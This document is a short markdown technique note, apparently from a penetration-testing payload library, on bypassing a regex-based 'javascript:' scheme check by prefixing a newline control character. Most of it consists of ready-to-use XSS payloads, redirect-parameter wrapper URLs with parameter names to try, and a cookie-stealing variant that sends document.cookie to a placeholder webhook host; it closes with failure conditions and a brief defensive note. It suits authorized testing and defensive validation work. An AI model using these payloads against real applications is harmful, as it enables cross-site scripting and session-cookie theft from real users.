# Control-Character JavaScript URI Bypass

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a redirector or client-side navigation helper takes a user-controlled URL
- validation uses a raw-string regex such as `/^javascript:/i`
- the application assigns the accepted value to `location.href`, `location`, or `window.open`
- there is no normalization or parsing before the scheme check

## Minimal Payload

```text
\njavascript:alert(1)
```

URL-encoded query variant:

```text
%0Ajavascript:alert(1)
```

## Same-Origin Wrapper Example

```text
https://[host]/?redirect_uri=%0Ajavascript:alert(1)
```

Adjust the parameter name to match the target: `redirect_uri`, `url`, `next`, `to`, or `return`.

## Cookie Exfil Variant

```text
\njavascript:fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))
```

Wrapper URL:

```text
https://[host]/?redirect_uri=%0Ajavascript:fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))
```

## Why It Works

The regex sees a leading control character, so the string does not literally start with `javascript:`. The browser then normalizes the input before navigation and interprets the resulting scheme as `javascript:`.

## Why It Fails

- The app trims or normalizes before validation.
- The app parses via `new URL()` and enforces safe schemes.
- The sink rejects non-network schemes after normalization.
- Browser or CSP restrictions block the follow-on exfil step.

## Common Mistakes

- Testing only mixed-case `JaVaScRiPt:` and forgetting prefix normalization tricks.
- Forgetting to URL-encode the leading control character when using query parameters.
- Assuming the bypass works without confirming a real execution side effect first.
- Storing live flags, webhook URLs, or cookies in reusable payload files.

## Defensive Note

Blocklisting a dangerous scheme with a raw regex is fragile. Normalize first, then use a positive allowlist of safe schemes.
